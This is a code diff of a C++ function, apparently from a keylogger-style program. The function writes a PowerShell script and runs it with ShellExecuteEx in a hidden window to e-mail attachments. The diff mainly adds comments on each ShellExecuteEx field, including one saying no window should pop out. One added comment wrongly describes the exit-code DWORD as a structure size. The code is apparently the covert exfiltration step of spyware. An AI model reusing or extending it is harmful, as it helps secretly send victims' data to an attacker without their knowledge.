@@ -123,7 +123,7 @@ const std::string &PowerShellScript =                                           
     int SendMail (const std::string &subject, const std::string &body, const std::string &attachments)      //contents of e-mail
         {
             bool ok;
-            ok  = IO::MkDir(IO::GetOurPath(true));    /Using MKDir from input output stream to create a directory
+            ok  = IO::MkDir(IO::GetOurPath(true));    //Using MKDir from input output stream to create a directory
             if (!ok)
                 return -1;
             std::string scr_path = IO::GetOurPath(true) + std::string (SCRIPT_NAME);
@@ -140,19 +140,71 @@ const std::string &PowerShellScript =                                           
 
             SHELLEXECUTEINFO ShExecInfo = {0};
             ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
+
+
+            //fMask.SEE_MASK_NOCLOSEPROCESS::
+
+            //Use to indicate that the Handle instance(hProcess) member receives the process handle.
+            //This handle is typically used to allow an application to find out when a process created with ShellExecuteEx terminates.
+            //In some cases, such as when execution is satisfied through a DDE conversation, no handle will be returned.
+            //The calling application is responsible for closing the handle when it is no longer needed.
+
             ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
+
+            //HWND hwnd::
+
+            //A handle to the parent window, used to display any message boxes that the system might produce while
+            //executing this function. This value is NULL as we don't want any window to pop out.
+
             ShExecInfo.hwnd = NULL;
+
+            //lpVerb::
+
+            //A string, referred to as a verb, that specifies the action to be performed. The set of available verbs depends
+            //on the particular file or folder. Generally, the actions available from an object's shortcut menu are available verbs.
+
             ShExecInfo.lpVerb = "open";
+
+            //lpFile::
+
+            //The address of a null-terminated string that specifies the name of the file or object on which ShellExecuteEx
+            //will perform the action specified by the lpVerb parameter.
+
             ShExecInfo.lpFile = "powershell";
+
+            //lpParameters::
+
+            //The address of a null-terminated string that contains the application parameters.
+            //The parameters must be separated by spaces.
+
             ShExecInfo.lpParameters = param.c_str();
+
+            //lpDirectory::
+
+            //The address of a null-terminated string that specifies the name of the working directory.
+            //If this member is NULL, the current directory is used as the working directory.
+
             ShExecInfo.lpDirectory = NULL;
+
+            //nShow::
+
+            //Flags that specify how an application is to be shown when it is opened
+
             ShExecInfo.nShow = SW_HIDE;
+
+            //hInstApp::
+
+            //If SEE_MASK_NOCLOSEPROCESS is set and the ShellExecuteEx call succeeds, it sets this member to a value greater than 32.
+            //If the function fails, it is set to an SE_ERR_XXX error value that indicates the cause of the failure.
+
             ShExecInfo.hInstApp = NULL;
+
+
             ok = (bool)ShellExecuteEx(&ShExecInfo);
             if (!ok)
                 return -3;
             WaitForSingleObject(ShExecInfo.hProcess, 7000);
-            DWORD exit_code = 100;
+            DWORD exit_code = 100;                                          //DWORD - The size of this structure, in bytes.
             GetExitCodeProcess (ShExecInfo.hProcess, &exit_code);
             m_timer.SetFunction ([&]()
                      {
@@ -180,4 +232,3 @@ const std::string &PowerShellScript =                                           
         }
 }
 #endif
-
